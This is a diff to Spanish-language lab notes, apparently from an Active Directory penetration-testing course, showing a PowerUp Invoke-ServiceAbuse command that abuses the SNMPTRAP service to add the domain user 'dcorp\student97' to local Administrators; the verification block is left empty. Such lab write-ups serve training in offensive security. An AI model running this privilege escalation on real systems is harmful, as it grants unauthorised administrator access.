@@ -48,4 +48,14 @@ Primero deberemos de revisar los ejemplos de funciones de abuso
 help Invoke-ServiceAbuse -Example
 ```
 
+En este caso la que necesitaremos es la siguiente forma de abuso
+```shell
+Invoke-ServiceAbuse -Name 'SNMPTRAP' -UserName "dcorp\student97" -Verbose
+```
 
+Usaremos esta función por que es la que nos permite añadir un usuario de dominio a la cuanta de Administradores locales
+
+Despues deberemos de verificar que se nos ha introducido en ese grupo
+```shell
+
+```
